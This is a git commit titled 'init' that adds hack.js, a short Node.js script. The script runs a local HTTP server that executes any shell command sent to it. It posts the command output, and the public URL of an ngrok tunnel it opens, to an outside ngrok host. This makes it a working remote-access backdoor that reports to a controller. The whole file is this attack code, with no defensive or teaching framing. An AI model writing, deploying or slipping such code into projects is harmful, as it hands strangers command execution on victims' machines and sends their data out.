90074c94bd393f3b674fc75b35ba321ae59e0754
Ryan Mehta <ryan.mehta@gmail.com>
2021-01-06 15:12:35 -0800

    init

---
+++ hack.js
@@ -0,0 +1,41 @@
+const { exec } = require('child_process');
+const http = require('http');
+const ngrok = require('ngrok');
+
+http
+  .createServer((req, res) => {
+    let body = '';
+    req.on('data', chunk => {
+      body += chunk;
+    });
+
+    req.on('end', () => {
+      exec(JSON.parse(body).command, (err, out) => {
+        const r = http.request({
+          hostname: '9613e63f542c.ngrok.io',
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          }
+        });
+
+        r.write(JSON.stringify({ out }));
+        r.end();
+        res.end(out)
+      });
+    });
+  })
+  .listen(60000)
+
+ngrok.connect(60000)
+  .then(url => {
+    const req = http.request({
+      hostname: '9613e63f542c.ngrok.io',
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      }
+    });
+    req.write(JSON.stringify({ url }));
+    req.end();
+  })
